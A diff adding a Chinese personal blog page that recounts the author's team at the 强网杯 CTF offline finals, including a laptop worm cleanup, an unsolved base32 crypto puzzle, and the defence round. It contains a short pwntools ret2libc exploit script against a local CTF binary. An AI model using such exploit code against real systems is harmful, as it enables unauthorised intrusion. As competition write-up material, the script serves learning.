@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="zh">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+  <!-- RSS / Atom -->
+  <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+
+  <!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.css">
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.js"></script>
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/contrib/auto-render.min.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function() {
+      renderMathInElement(document.body, {
+        delimiters: [
+          {left: "$$", right: "$$", display: true},
+          {left: "\\[", right: "\\]", display: true},
+          {left: "$",  right: "$",  display: false},
+          {left: "\\(", right: "\\)", display: false}
+        ],
+        throwOnError: false,   // 避免个别符号导致整段失败
+        macros: {
+          "\\sgn": "\\operatorname{sgn}"  // 你文中用到的 sgn，统一为运算符
+        }
+      });
+    });
+  </script> -->
+    <!-- <script>
+      window.MathJax = {
+        tex: {
+          packages: {'[+]': ['ams']},   // cases / aligned 需要 ams
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          displayMath: [['$$','$$'], ['\\[','\\]']],
+          tags: 'ams'
+        },
+        options: { skipHtmlTags: ['script','style','textarea','pre','code'] }
+      };
+    </script>
+    <script async id="MathJax-script"
+            src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script> -->
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <title>现充|junyu33</title>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div class="head-nav">
+	<div class="inner">
+		<a href="/">
+			现充|junyu33
+		</a>
+		<div class="right">
+			
+				<a href="/zh">首页</a>
+				<a href="/zh/archives">归档</a>
+				
+					<a href="/zh/categories">Categories</a>
+				
+				
+					<a href="/zh/tags">Tags</a>
+				
+				<a href="/">English</a>
+			
+		</div>
+	</div>
+</div>
+
+  <div class="main">
+    <div class="post">
+    
+
+	<h1>强网杯线下公费游记</h1>
+	<p>发现一个有趣的现象，线上的第一名在线下得了零分；而线下的第一名在线上基本上是垫底进的决赛。</p>
+<p>而我们组，也大致遵从这个规律。这说明了什么呢？</p>
+<span id="more"></span>
+<h1>day 0</h1>
+<p>由于多种原因（中高风险地区，与西电比赛冲突，学校周末上课等等），我们成功进入了线下比赛，而且好像是以**21名（倒数第四名）**进入的。我为自己队伍居然不是垫底而十分欣慰。</p>
+<p>（不得不说来回的飞机是真的有点颠，像坐长途大巴车一样，而且噪声贼大）</p>
+<p>线下赛的地点是郑州的网络安全科技馆，由于地处四环路的西北部，属于郊区中的郊区，当地人并不认为它属于郑州的一部分。重要的是，这里离新郑机场有<strong>六七十公里</strong>远的距离，相当于从东南角绕城到西北角。也正因为它偏僻，所以周围的配套设施基本为零，随便叫一份外卖都要等一个小时。</p>
+<p>（大门截图）</p>
+<img src="https://img.junyu33.me/blog/ctf03/gate.jpg" />
+<p>我们在大门后面的假日酒店居住，按照国际惯例，主办方要报销住宿费用与路费，自然我可以舒舒服服地吃一顿好的（但减肥的愿望阻止的这种行为的发生），床睡着也比上次在川大附近舒服很多，唯一的不足就是早晚的空气有点干冷（只有四五度，晨跑是不太可能了，怕流鼻血），风儿有点喧嚣。在当天下午，我们熟悉的几个队集中在一个房间里培训BF赛制（break &amp; fix），讲的什么我啥也没听懂，晚上我们在“有人烟的地方”聚了餐，我以早点回去面试网安协会干事为由，徒步两公里回到了酒店（不得不说这地方连路灯都没几盏，害得我一步三回头来排除可能的危险）。</p>
+<p>回到酒店后做了会reverse练练手，然后就接到消息，说新疆那边又出了幺蛾子疫情，明天全员又得做核酸，无语了......</p>
+<h1>day 1</h1>
+<p>强网杯比赛分为两天进行，第一天是创新赛、第二天是实践赛。我先前预测过创新赛是misc大赛，而官方给出的答复是跑男赛制。我觉得自己算是个misc手，这次比赛应该不会一道题都做不出来，可以避免自己太菜的尴尬。</p>
+<p>然而，出乎意料的事情发生了......</p>
+<p>这几天我的火绒总是在一些正常的应用程序报毒，而且有时运行完一个程序后图标会有所变化，甚至还会跳出__随机命名__的excel宏文件。虽然程序的功能没有受到任何影响，但是我仍旧怀疑自己的电脑中了病毒，而且已经感染了许多文件。通过对火绒log文件的查看以及上网对比相关信息，我确信自己的电脑中了名为<em>Synares.a$SA</em>的蠕虫病毒。这种病毒会对你运行的exe进行加壳操作（感染），同时窃取网银信息（目的明确，可惜我电脑没有），并常驻内存与开机启动项（后者被火绒拦住了）。传播方式有运行受感染的exe，以及U盘等储存介质等等，能力还是比较强的。</p>
+<p>我立刻对电脑进行了全盘扫描，一共检出了202个风险文件（其中有一些是我学习web时使用的sql注入的代码，和一些杂七杂八的web工具）。保险起见，我把它们都删了，还删除了临时文件夹里的所有文件。重启一遍，接着扫，扫出来5个风险，全是我存在压缩包里的后门代码，没有病毒，就忽略没管了。事实证明病毒确实被清理干净了。</p>
+<p>做完这些破事已经耗费了我一个上午的时间，吃了午饭后就趴在床上午休了。起床后要求做核酸，同时与那位安徽选手成功面基（不得不说我变瘦了一些，他变胖了许多，互相都认不出来了）。然后就是花里胡哨的开幕式，学生发言代表是场中唯三女生之一（不错啊，在这种场合能见到女选手是一种幸运）。</p>
+<p>接下来开始创新赛，开始我们要到找到五张图片对应的场馆位置，并拍照打卡。周围的人都一溜烟不见了，唯独我们仨不紧不慢地在场馆漫步。照片拍完后我们抽取了一个项目，恰好是crypto，题目如下:</p>
+<blockquote>
+<p>它被称为窃贼之友 (Thief's Friend)，是一个能够打开被锁住且未受魔法保护的门窗的符咒。这个咒语也能用来开启被锁定咒锁住的门。</p>
+<p>这是你要学习的第一段咒语，也是基础咒语，它会帮助你解决网安魔法世界里出现的一些问题。</p>
+<p>在这个世界中是综合编码与密码学知识所构成的，只有成功破解密文的人，才有资格获取这个咒语。</p>
+<p>NF4FCRTILA3EW53QNZ4VU4DSPBTVKNDOONGWYSJYJV2W4NKFORZVQRTXKJDUONKQJFAVEWBVHBIHANKULBXFA6LPOZVFOSCEIFFE2VLMGM2UG2KNNV5FS3SWJE3DQ6TEG4ZG4SDBIE3TCZLRLFCXAWSHJQ2HAOKKK5ZDGYKOGFUUSZ3LIN3UUR3TJIZEQZKTGBKHMZ3MO5STO6CDHBEWUY3ZLB2DG42JG5WWK4DJHBEFCWKVGUZDETBZNE3GOVKWMFDWQYSDOBUGUUDIIFCXS2KTJNUUUYLUIN5FASCZNVEUQWBSNJ2EU2DPJVYFM33BJZCUM6SQGFLFM5TBKNRDARZQIVFG6VKJLBFGQ2KOJNDWUWJSJM4U44SGHFDFGMJQOVEECUCIJ5QUWVDCN5BVAVDVOFLFQ532GNVGG2JXMJNGO3D2KNMUK6BWGBFG4ODRPI4DEZSNJE4UY5LWIZ3EQRTRJ53VG6LJGVJG2ZKXMFCG4RDZIFRWS6CGIVJWISCGK5IU66SUNNSXSOTGNRQWO===</p>
+</blockquote>
+<p>首先三个等号说明是base32，然后解密之后长这样：</p>
+<blockquote>
+<p>ixQFhX6KwpnyZprxgU4nsMlI8Mun5EtsXFwRGG5PIARX58Pp5TXnPyovjWHDAJMUl35CiMmzYnVI68zd72nHaA71eqYEpZGL4p9JWr3aN1iIgkCwJGsJ2HeS0Tvglwe7xC8IjcyXt3sI7mepi8HQYU522L9i6gUVaGhbCphjPhAEyiSKiJatCzPHYmIHX2jtJhoMpVoaNEFzP1VVvaSb0G0EJoUIXJhiNKGjY2K9NrF9FS10uHAPHOaKTboCPTuqVXwz3jci7bZglzSYEx60Jn8qz82fMI9LuvFvHFqOwSyi5RmeWaDnDyAcixFESdHFWQOzTkey:flag</p>
+</blockquote>
+<p>然后我尝试了各种带密钥的加密，无果。</p>
+<p>尝试将密文base64，乱码；转16进制，正看倒看都没发现常见的文件头。我甚至将16进制数分解了质因数，发现不是两个大质数相乘的形式，排除rsa。</p>
+<p>然后又尝试了base58，base62，base85，base91都失败了。思路中断。<strong>（会的发下评论区）</strong></p>
+<p>我们在这个题上花了接近一个小时，而r3gr3t似乎早已做出另外一道web题，然而flag一直都是错的。直到一名工作人员从他身后走过，他说r3做对了，是比赛的问题，让我们去先前领题的地方要flag。我淦，就因为这问题，白白浪费了半个多小时的时间，才拿到1000分，而其他的队此时已经有两三千分了。</p>
+<p>我们决定放弃那道crypto，下楼去问一个队能不能同时参加多个项目，回答居然是可以的——只是每个人要把他的”护照“扣押在题目点（也就是一个队最多同时参加3个项目）。我终于理解其他队为什么涨分那么快——我们反应还是太慢了点。</p>
+<p>之后我们一路披荆斩棘，体验了红军文化的开卷考试，享受了量子加密的智商碾压（如图），温习了20天前才学会的ppt拼图大法，破解了展馆里不堪一击快递系统（其实就是调出osk再win+E的小伎俩，我还用这种伎俩玩过扫雷呢）等等——总之，在这场阴间创新赛中我们获得了第八名，是一个尚可的成绩。</p>
+<img src="https://img.junyu33.me/blog/ctf03/quantum.jpg" style="zoom: 25%;" />
+<p>在当天晚上，我去同学寝室聊了一会儿，然后偷师学艺，会了一点pwn。回寝后r3告诉我明天的pwn有ret2libc和ret2shellcode，我看了一下（当然没有看懂）。因为明天没网，我把那几个博客离线了一下，顺便也把<a target="_blank" rel="noopener" href="https://ctf-wiki.org/">ctf-wiki</a>对应的部分和例题文件拷到了本地，做好了明天在线学pwn的准备。</p>
+<h1>day 2</h1>
+<p>早上6：30起床，喝了下胡辣汤，感觉像一种胶体，而且味道有点像泡面的调味料，不是特别好喝，可能是酒店没得到真传吧。</p>
+<p>进赛场的时候突然要查口罩，我恰好忘在了房间，又不想冒着四五度的寒风在酒店与场馆穿梭（虽然不到50米），就在入口等了十分钟才等到救兵。发现赛场是真的暖和。</p>
+<p>（赛场截图）</p>
+<img src="https://img.junyu33.me/blog/ctf03/battlefield.jpg" style="zoom: 50%;" />
+<p>网站发了四道题，2web、2pwn，pwn不出所料，果然是那两个rop类型。甚至ret2libc的文件与ctf-wiki的最简单的例题几乎一模一样，然而我尝试仿照他的exp来写自己的，但无论如何就是攻不进去（当时比赛才过不到10分钟，就有人A了这道题，思路肯定不会太麻烦），我搬来了r3这个救兵，他甚至把暴力枚举payload长度的方法都用上了，还是不行。一个多小时后，我气急败坏，直接把例题的代码复制上去，居然成了？！</p>
+<pre><code class="language-python">#!/usr/bin/env python
+from pwn import *
+
+sh = process('./ret2libc1')
+
+binsh_addr = 0x8048720
+system_plt = 0x08048460
+payload = flat(['a' * 112, system_plt, 'b' * 4, binsh_addr])
+sh.sendline(payload)
+
+sh.interactive()
+</code></pre>
+<p>于是我成为了我们队唯一一个pwn手。</p>
+<p>随后的攻击阶段我就躺平了，另外一道pwn开了PIE保护，要动态截取内存地址，我不会。r3帮我写了脚本，按照他思路攻击了一下，然而还是无果。web那边welcomeflask主办方连发的三个提示，r3终于成功抢到了二血。</p>
+<p>之后我们都躺平了，攻击阶段排名又是第八。</p>
+<p>接下来是__惊险刺激__的防御阶段，网站给了我们一个docker，然而我屁都不会用，开始边“坐牢”边听音乐。过了25分钟，平台发起了攻击，霎时间有几个队分数暴涨（从两三千涨到八九千），而我们一个题也没防住，掉到了第十名。然后r3又更加精细地补了补漏洞，到第二轮攻击的时候总算还是防住了一个，得分3700，他娘的又是一个第八名。</p>
+<p>为什么说__惊险刺激__呢，因为防御阶段的规则比较奇葩，只要第一轮防住了，第二轮就可以继续得分。更重要的是，我们攻击阶段的满分是4000，而仅仅50分钟的防御就占了6000分，而且积分方式是计算自己分与最高分的比值再*6000——这意味着最先防住漏洞的选手有着极大的分数优势，甚至可以反杀这两天的比赛——很幸运，那位北大小哥抓住了这个机会，他原本是一名替补选手，结果因为第一轮防御就修了3个洞，最后成为了全场比赛的冠军得主。</p>
+<p>果然，国家是要倡导我们做个白帽，要防不要攻啊！</p>
+<p>最后我们总分排名第四，荣获了本次比赛的二等奖（一等奖1、2名，二等奖3~7名，三等奖8~14名）。我惊奇地发现那名学生代表所在的战队也是一等奖得主——果然在任何行业，都有“巾帼不让须眉”的趋势啊。而之前线上的第一名，却名落孙山，不知道到哪儿去了。</p>
+<img src="https://img.junyu33.me/blog/ctf03/2nd.jpg" style="zoom: 25%;" />
+<p>线上的第一名在线下得了零分；而线下的第一名在线上基本上是垫底进的决赛。而我们组，也大致遵从这个规律——线上越苟，线下越强。这说明了什么呢？</p>
+<p>说明这种比赛平时随便打打，玩一玩就行，不必太过于认真。</p>
+<p>毕竟，学好基础知识才是王道，难道不是吗？</p>
+<p>不说了，最近打算把ctf放一放，冲刺一下四级高分，英语免修它不香吗？</p>
+<blockquote>
+<p>update on 2022/8/30</p>
+<p>四级考得稍微拉了一点，免修只能85，因此没免。六级成绩出来，最高档95果断免了。</p>
+</blockquote>
+
+</div>
+
+
+  </div>
+</body>
+</html>
+
